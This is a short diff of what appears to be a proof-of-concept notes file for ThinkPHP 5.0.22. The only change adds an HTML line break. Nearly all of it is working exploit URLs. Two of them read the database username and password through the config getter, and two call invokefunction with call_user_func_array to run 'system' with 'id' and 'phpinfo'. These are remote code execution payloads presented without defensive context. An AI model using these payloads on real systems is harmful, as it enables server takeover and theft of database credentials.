@@ -3,7 +3,7 @@
 
 POC：
 thinkphp 5.0.22
-1、http://192.168.1.1/thinkphp/public/?s=.|think\config/get&name=database.username
+1、http://192.168.1.1/thinkphp/public/?s=.|think\config/get&name=database.username</br>
 2、http://192.168.1.1/thinkphp/public/?s=.|think\config/get&name=database.password
 3、http://url/to/thinkphp_5.0.22/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
 4、http://url/to/thinkphp_5.0.22/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1
